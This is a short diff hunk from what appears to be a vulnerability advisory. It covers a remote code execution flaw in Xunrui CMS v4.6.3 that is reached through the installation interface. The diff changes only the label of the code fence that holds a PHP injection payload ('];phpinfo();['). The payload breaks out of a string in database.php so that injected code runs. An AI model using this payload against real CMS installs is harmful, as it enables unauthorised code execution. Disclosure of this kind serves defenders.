@@ -6,7 +6,7 @@ The RCE is connected through the CMS installation interface
 - Xunrui CMS Website Edition/Popular Edition v4.6.3 (2024-12-17)
 
 ## Payload:
-```php ;-- ---'];phpinfo();['```
+``` exp;-- ---'];phpinfo();['```
 
 Vulnerability Reproduction:
 Normal installation of .database.php
